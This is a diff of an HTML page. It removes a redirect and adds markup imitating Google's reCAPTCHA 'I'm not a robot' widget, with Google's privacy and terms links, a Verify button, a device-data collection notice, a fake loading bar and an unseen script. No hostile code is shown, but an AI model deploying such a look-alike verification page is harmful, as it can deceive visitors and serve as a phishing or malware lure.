@@ -3,38 +3,70 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="refresh" content="0; url=./kio-main/index.html" />
-    <title>reCAPTCHA Verification Demo</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        margin: 0;
-        min-height: 100vh;
-        display: grid;
-        place-items: center;
-        background: #f5f5f5;
-        color: #222;
-      }
-      .box {
-        padding: 2rem;
-        background: white;
-        border-radius: 8px;
-        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
-        text-align: center;
-      }
-      a {
-        color: #1a73e8;
-        text-decoration: none;
-      }
-      a:hover {
-        text-decoration: underline;
-      }
-    </style>
+    <title>Document</title>
+    <link rel="stylesheet" href="./assets/css/main.css" />
   </head>
   <body>
-    <main class="box">
-      <h1>Opening the site…</h1>
-      <p>If you are not redirected automatically, <a href="./kio-main/index.html">click here</a>.</p>
-    </main>
+    <div class="container m-p">
+      <div id="checkbox-window" class="checkbox-window m-p block">
+        <div class="checkbox-container m-p">
+          <button
+            type="button"
+            id="checkbox"
+            class="checkbox m-p line-normal"
+          ></button>
+        </div>
+        <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+        <img
+          src="./assets/img/ca.png"
+          class="captcha-logo line-normal"
+          alt=""
+        />
+        <br />
+        <p class="checkbox-desc m-p line-normal">
+          <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a>
+          - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+        </p>
+        <img class="spinner" alt="" id="spinner" />
+      </div>
+
+      <div id="verify-window" class="verify-window">
+        <div class="verify-container">
+          <header class="verify-header">
+            <span class="verify-header-text-medium m-p block">Verification</span>
+            <span class="verify-header-text-big m-p block">Complete</span>
+            <span class="verify-header-text-medium m-p block"></span>
+          </header>
+          <main class="verify-main">
+            <p id="verification-status">Checking this browser locally...</p>
+          </main>
+        </div>
+        <footer class="verify-container verify-footer">
+          <div class="verify-footer-left">
+            Limited device and session information is collected for operational monitoring.
+          </div>
+          <button
+            type="button"
+            class="verify-verify-button block"
+            id="verify-verify-button"
+          >
+            Verify
+          </button>
+        </footer>
+      </div>
+
+      <section id="final-loader" class="final-loader" hidden aria-live="polite">
+        <div class="final-loader-inner">
+          <div class="final-loader-heading">
+            <span>LOADING...</span>
+            <span id="loader-percent">0%</span>
+          </div>
+          <div class="progress-track" aria-hidden="true">
+            <div id="progress-bar" class="progress-bar"></div>
+          </div>
+        </div>
+      </section>
+    </div>
+    <script src="./assets/js/main.js"></script>
   </body>
 </html>
